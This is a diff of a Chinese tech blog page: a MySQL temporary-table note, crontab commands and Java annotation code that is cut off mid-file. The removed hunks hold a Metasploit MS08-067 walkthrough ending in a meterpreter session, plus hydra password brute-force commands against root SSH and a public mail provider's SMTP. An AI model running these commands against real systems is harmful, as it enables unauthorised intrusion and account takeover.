BY子句和一个不同GROUP BY子句的语句，ORDER BY或者GROUP BY包含来自除连接队列中的第一个表以外的表的列或包含该列的语句。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DISTINCT结合 评估ORDER BY可能需要临时表。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">对于使用SQL_SMALL_RESULT 修饰符的查询，MySQL使用内存中的临时表，除非查询还包含需要磁盘存储的元素（稍后介绍）。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">为了评估 INSERT ... SELECT从同一个表中选择并插入到同一个表中的语句，MySQL创建一个内部临时表来存放来自该表的行 SELECT，然后将这些行插入到目标表中。</span><br><span class="line">请参见 第13.2.5.1节“INSERT ... SELECT语法”。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">评估多表 UPDATE报表。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">评估GROUP_CONCAT() 或COUNT(DISTINCT) 表达。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">要确定某个语句是否需要临时表，请使用 EXPLAIN并检查该 Extra列以查看它是否显示 Using temporary（请参见 第8.8.1节“使用EXPLAIN优化查询”）。</span><br><span class="line">对于派生或物化临时表格EXPLAIN 不一定会说Using temporary。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">当服务器创建内部临时表（无论是在内存中还是在磁盘上）时，它都会增加 Created_tmp_tables状态变量。</span><br><span class="line">如果服务器在磁盘上创建表（最初或通过转换内存表），它将增加 Created_tmp_disk_tables状态变量。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">某些查询条件会阻止使用内存中的临时表，在这种情况下，服务器会使用磁盘上的表：</span><br><span class="line"></span><br><span class="line">表中存在一列BLOB或一 TEXT列。</span><br><span class="line">这包括具有字符串值的用户定义变量，因为它们被视为 BLOB或 TEXT列，这取决于它们的值分别是二进制还是非二进制字符串。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SELECT如果使用UNION或 UNION ALL 使用列表中 最大长度大于512（二进制字符串的字节，非二进制字符串的字符）的任何字符串列。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">的SHOW COLUMNS和 DESCRIBE语句中使用 BLOB作为用于某些列的类型，从而用于结果的临时表是磁盘上的表。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">服务器不会为UNION符合某些资格的语句使用临时表 。</span><br><span class="line">相反，它从临时表创建中仅保留执行结果列类型转换所需的数据结构。</span><br><span class="line">该表没有完全实例化，没有行被写入或读取; 行直接发送到客户端。</span><br><span class="line">结果是内存和磁盘需求减少，第一行发送到客户端之前的延迟更小，因为服务器不需要等到最后一个查询块被执行。</span><br><span class="line">EXPLAIN而优化器跟踪输出反映了这种执行策略： UNION RESULT 查询块不存在，因为该块对应于从临时表读取的部分。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">这些条件有资格在UNION没有临时表的情况下进行评估：</span><br><span class="line"></span><br><span class="line">工会是UNION ALL，不是 UNION或UNION DISTINCT。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">没有全球ORDER BY条款。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">联合不是&#123;INSERT | REPLACE&#125; ... SELECT ... 语句的顶级查询块 。</span><br></pre></td></tr></table></figure></p>
+<p>内部临时表存储引擎<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">内部临时表可以在内存中保持并且由处理MEMORY存储引擎，或者由存储在磁盘上InnoDB或 MyISAM存储引擎。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">如果内部临时表被创建为内存表，但变得太大，MySQL会自动将其转换为磁盘上的表。</span><br><span class="line">内存中临时表的最大大小取决于哪个值tmp_table_size和 max_heap_table_size更小值 。</span><br><span class="line">这与MEMORY显式创建的表有所不同CREATE TABLE：对于这些表，只有 max_heap_table_size系统变量决定允许表增长多少，并且没有转换为磁盘格式。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">所述 internal_tmp_disk_storage_engine 系统变量确定哪个存储引擎服务器使用来管理的磁盘上的内部临时表。</span><br><span class="line">允许的值是INNODB（默认值）和 MYISAM。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">注意</span><br><span class="line">使用时 internal_tmp_disk_storage_engine=INNODB，生成超出InnoDB 行或列限制的磁盘内部临时表的查询 将返回行大小过大或列 错误过多。</span><br><span class="line">解决方法是设置 internal_tmp_disk_storage_engine 为MYISAM。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">内部临时表格存储格式</span><br><span class="line">内存中的临时表由MEMORY存储引擎管理，该 引擎使用固定长度的行格式。</span><br><span class="line">VARCHAR并且 VARBINARY列值被填充到最大列长度，实际上将它们存储为 CHAR和BINARY列。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在磁盘上的临时表由管理 InnoDB或MyISAM存储引擎（取决于 internal_tmp_disk_storage_engine 设置）。</span><br><span class="line">两个引擎都使用动态宽度行格式存储临时表。</span><br><span class="line">列只根据需​​要获取尽可能多的存储空间，与使用固定长度行的磁盘表相比，它减少了磁盘I / O和空间要求以及处理时间。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">对于最初在内存中创建内部临时表的语句，然后将其转换为磁盘上表，通过跳过转换步骤并在磁盘上创建表开始，可以获得更好的性能。</span><br><span class="line">所述 big_tables系统变量可以用来迫使内部临时表的磁盘存储。</span><br></pre></td></tr></table></figure></p>
+
+          
+        
+      
+    </div>
+
+    
+      
+
+  <div class="popular-posts-header">相关文章</div>
+  <ul class="popular-posts">
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/mysql/optimization-sql-thread/" rel="bookmark">SQL优化【线程信息检查】</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/mysql/optimization-sql-sentence/" rel="bookmark">SQL优化【SQL语句】</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/mysql/optimization-sql-total/" rel="bookmark">SQL优化【总方向】</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/mysql/optimization-sql-cached/" rel="bookmark">SQL优化【缓存优化】</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/mysql/optimization-sql-lock/" rel="bookmark">SQL优化【锁优化】</a></div>
+      
+    </li>
+  
+  </ul>
+
+
+    
+
+    
+    
+    
+
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/shell/crontab/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="上善若水">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="上善若水の技术簿">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2018/03/24/shell/crontab/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/18/index.html">crontab</a>
               
             
           </h2>
@@ -566,7 +784,7 @@
       
         
           
-            <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">cd</span><br><span class="line"></span><br><span class="line">ps</span><br><span class="line"></span><br><span class="line">ps -ef</span><br><span class="line"></span><br><span class="line">ps -ef | grep &quot;&quot;</span><br><span class="line"></span><br><span class="line">| 管道符</span><br><span class="line">#移动文件</span><br><span class="line">mv  /usr/bin/mysql.db /var/data/mysql/mysql-2017-09-09.db</span><br><span class="line"></span><br><span class="line">#复制文件</span><br><span class="line">cp  /usr/bin/mysql.db /var/data/mysql/mysql-2017-09-09.db.backup</span><br><span class="line">#复制文件夹</span><br><span class="line">cp -a /usr/bin/  /var/data/mysql/</span><br><span class="line"></span><br><span class="line"> mkdir New_Dir</span><br><span class="line"> mkdir -p New_Dir/Sub_Dir/Under_Dir </span><br><span class="line"></span><br><span class="line">sh .../*.sh</span><br><span class="line"></span><br><span class="line">vim 123.txt</span><br><span class="line"></span><br><span class="line">tail -f ../*.log </span><br><span class="line">tail -f -n1000 ../*.log</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#压缩</span><br><span class="line">tar -zcvf test.tar.gz ./test/</span><br><span class="line">#解压</span><br><span class="line">tar xzvf test.tar.gz</span><br></pre></td></tr></table></figure>
+            <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">/crond start    //启动服务</span><br><span class="line">/sbin/service crond stop     //关闭服务</span><br><span class="line">/sbin/service crond restart  //重启服务</span><br><span class="line">/sbin/service crond reload   //重新载入配置&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">service crond status</span><br><span class="line">service crond start</span><br><span class="line"></span><br><span class="line">查看crontab服务是否已设置为开机启动，执行命令：</span><br><span class="line">ntsysv</span><br><span class="line">加入开机自动启动：</span><br><span class="line">chkconfig -level 35 crond on</span><br><span class="line"></span><br><span class="line">定制脚本</span><br><span class="line">crontab -e  </span><br><span class="line">相当于vim</span><br><span class="line">文档加入</span><br><span class="line">0 1 * * * root /data/bakdb.sh  &gt; /data/bak.log 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">*/2 * * * * /bin/bash -x /shell/web_monit/http_monit.sh  &gt; /dev/null 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">查看定时任务</span><br><span class="line">crontab -u root -l</span><br></pre></td></tr></table></figure>
 
           
         
@@ -868,7 +1086,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/hack/metasploit-hack-windows/">
+    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/essay/essay-10/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="上善若水">
@@ -888,410 +1106,7 @@
           <h2 class="post-title" itemprop="name headline">
                 
                 
-                <a href="/2018/03/24/hack/metasploit-hack-windows/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/18/index.html">使用Metasploit入侵windows</a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2018-03-24 08:00:00" itemprop="dateCreated datePublished" datetime="2018-03-24T08:00:00+08:00">2018-03-24</time>
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/hack/" itemprop="url" rel="index"><span itemprop="name">hack</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body han-init-context" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>使用msfconsole 查看window发布的漏洞</p>
-<p>运气好的话 你要破解的windows没有打补丁.那么使用该漏洞你就可以直接登陆到windows了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># msfconsole</span><br><span class="line"></span><br><span class="line">msf &gt; search platform: windows xp sp3</span><br><span class="line">msf &gt; search platform: windows 10</span><br><span class="line">msf &gt; search platform: android</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf &gt; info exploit/windows/smb/ms08_067_netapi</span><br><span class="line">使用info查看漏洞信息.</span><br><span class="line"></span><br><span class="line">msf &gt; use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">&gt; set payload windows/meterpreter/bind_tcp</span><br><span class="line">&gt; set RHOST 192.168.0.108  (设置目标主机IP地址)</span><br><span class="line">&gt; exploit</span><br><span class="line">设定攻击方式.攻击ip</span><br><span class="line"></span><br><span class="line">攻击成功:</span><br><span class="line">[*] Started bind handler</span><br><span class="line">[*] Automatically detecting the target...</span><br><span class="line">[*] Fingerprint: Windows XP SP3 - Service Pack 3 - lang:Chinese</span><br><span class="line">[*] Selected Target: Windows XP SP3 Chinese (AlwaysOn NK)</span><br><span class="line">[*] Attempting to trigger the vulnerability...</span><br><span class="line">[*] Sending stage (751104 bytes) to 192.168.0.108</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.0.1:41614 -&gt; 192.168.0.108:4444) at 2016-04-15 17:29:32</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br><span class="line"></span><br><span class="line">失败就尝试其他漏洞</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    
-      
-
-  <div class="popular-posts-header">相关文章</div>
-  <ul class="popular-posts">
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/about-hack/" rel="bookmark">关于漏洞和攻击</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/dos/" rel="bookmark">DOS攻击工具</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/art-infiltration/" rel="bookmark">渗透的艺术</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/filter-xss/" rel="bookmark">Filter安全过滤高级最终行（XSS攻击）</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/ssh-violence/" rel="bookmark">ssh远程登陆破解</a></div>
-      
-    </li>
-  
-  </ul>
-
-
-    
-
-    
-    
-    
-
-    
-
-    
-       
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/hack/ssh-violence/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="上善若水">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水の技术簿">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2018/03/24/hack/ssh-violence/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/18/index.html">ssh远程登陆破解</a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2018-03-24 08:00:00" itemprop="dateCreated datePublished" datetime="2018-03-24T08:00:00+08:00">2018-03-24</time>
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/hack/" itemprop="url" rel="index"><span itemprop="name">hack</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body han-init-context" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>利用ssh协议 暴力破解ssh密码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#hydra -s 22 -v -l root -P /usr/share/wordlists/rockyou.txt 192.168.0.108 ssh</span><br><span class="line">ssh 端口22 破解</span><br><span class="line"></span><br><span class="line"># hydra -S -l test@163.com -P /usr/share/wordlists/rockyou.txt -e ns -V -s 465 -t 1 smtp.163.com smtp</span><br><span class="line">邮箱破解 现在都加了许多验证.怕是不太靠谱了</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    
-      
-
-  <div class="popular-posts-header">相关文章</div>
-  <ul class="popular-posts">
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/about-hack/" rel="bookmark">关于漏洞和攻击</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/dos/" rel="bookmark">DOS攻击工具</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/art-infiltration/" rel="bookmark">渗透的艺术</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/filter-xss/" rel="bookmark">Filter安全过滤高级最终行（XSS攻击）</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/metasploit-hack-windows/" rel="bookmark">使用Metasploit入侵windows</a></div>
-      
-    </li>
-  
-  </ul>
-
-
-    
-
-    
-    
-    
-
-    
-
-    
-       
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/jdk/jdk-annotation/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="上善若水">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水の技术簿">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2018/03/24/jdk/jdk-annotation/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/18/index.html">自定义注解</a>
+                <a href="/2018/03/24/essay/essay-10/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/18/index.html">架构师之路</a>
               
             
           </h2>
@@ -1341,7 +1156,7 @@
                   ，
                 
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/jdk/" itemprop="url" rel="index"><span itemprop="name">jdk</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/essay/" itemprop="url" rel="index"><span itemprop="name">essay</span></a></span>
 
                 
                 
@@ -1377,9 +1192,18 @@
       
         
           
-            <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *</span><br><span class="line"> * @author 无心</span><br><span class="line"> * @date 2018-05-08 10:10:10</span><br><span class="line"> * 文档id</span><br><span class="line"> */</span><br><span class="line">@Inherited</span><br><span class="line">@Documented</span><br><span class="line">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="line">@Target(ElementType.FIELD)</span><br><span class="line">public @interface DocId &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@Documented</span><br><span class="line">@Inherited</span><br><span class="line">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="line">@Target(&#123;ElementType.TYPE&#125;)</span><br><span class="line">public @interface Document &#123;</span><br><span class="line">    //必须为小写</span><br><span class="line">    String index();</span><br><span class="line"></span><br><span class="line">    //分片数量</span><br><span class="line">    int shards() default 5;</span><br><span class="line"></span><br><span class="line">    //副本数</span><br><span class="line">    int replicas() default 1;</span><br><span class="line"></span><br><span class="line">    //数据刷新</span><br><span class="line">    String refreshInterval() default &quot;1s&quot;;</span><br><span class="line"></span><br><span class="line">    //存储类型</span><br><span class="line">    String indexStoreType() default &quot;fs&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>{———-}</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @author 无心</span><br><span class="line"> * @date 2018-05-08 10:10:10</span><br><span class="line"> * 注解获取封装</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">public class FieldUtil &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static void main(String [] args) throws IllegalAccessException, InstantiationException, NoSuchFieldException &#123;</span><br><span class="line"></span><br><span class="line">        MedCheckDoc medCheckDoc = new MedCheckDoc();</span><br><span class="line"></span><br><span class="line">        String string = getDocType(medCheckDoc.getClass());</span><br><span class="line">        System.err.print(string);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 获取Document注解中的值</span><br><span class="line">     * @param clazz</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static String getDocIndex(Class clazz)&#123;</span><br><span class="line">        Document document = (Document) clazz.getAnnotation(Document.class);</span><br><span class="line">        return document.index();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 获取Document注解中的值</span><br><span class="line">     * @param clazz</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static int getDocShards(Class clazz)&#123;</span><br><span class="line">        Document document = (Document) clazz.getAnnotation(Document.class);</span><br><span class="line">        return document.shards();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 获取Document注解中的值</span><br><span class="line">     * @param clazz</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static int getDocReplicas(Class clazz)&#123;</span><br><span class="line">        Document document = (Document) clazz.getAnnotation(Document.class);</span><br><span class="line">        return document.replicas();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 